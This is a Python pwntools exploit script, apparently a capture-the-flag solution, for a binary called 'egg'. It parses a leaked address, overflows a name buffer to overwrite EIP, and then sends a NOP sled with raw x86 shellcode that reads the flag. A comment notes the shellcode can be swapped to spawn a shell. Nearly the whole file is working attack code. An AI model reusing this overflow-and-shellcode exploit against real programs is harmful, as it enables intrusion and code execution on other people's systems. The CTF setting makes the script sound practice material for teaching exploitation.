#!/usr/bin/python
#coding:utf-8
'''
'''

import sys, string, re
import commands
from pwn import *

context.log_level = 'debug'
p = process('./egg')
#p = remote('10.105.42.5', 2334)
output = commands.getoutput('./r')
p.recvuntil('Welcome to Easter day!\n')
#print output

treat_trick = p.recvuntil('Baby, treat or trick? \n')
leak_addr = re.findall('is (.*)\n', treat_trick)[0]

#jump_addr = int(leak_addr,16) + 0x20 # change everytime
jump_addr = int(leak_addr, 16) + int(output) + 4
p.sendline('treat')

p.recvuntil('What\'s your name?\n')
payload = 'A'*4*5 + p32(jump_addr) # overflow point to control the eip
p.sendline(payload)

p.recvuntil('Put your sweets here.\n')

# shellcode: cat flag , can change to get shell
buf =  ""
buf += "\xbe\x40\xc6\x48\x6e\xdb\xc2\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x0c\x31\x72\x12\x03\x72\x12\x83\xaa\x3a\xaa"
buf += "\x9b\x40\xc8\x73\xfd\xc6\xa8\xeb\xd0\x85\xbd\x0b\x42"
buf += "\x66\xcd\xbb\x93\x10\x1e\x5e\xfd\x8e\xe9\x7d\xaf\xa6"
buf += "\xe3\x81\x50\x36\x97\xe0\x24\x16\x31\x8f\xa5\x31\xbd"
buf += "\x18\x75\x34\x5c\x6b\xf9"

payload = '\x90' * (250-len(buf)) + buf

p.sendline(payload)
#a = p.recv()
#if "TSCTF" in a:
#    print "Cooooool"
p.interactive()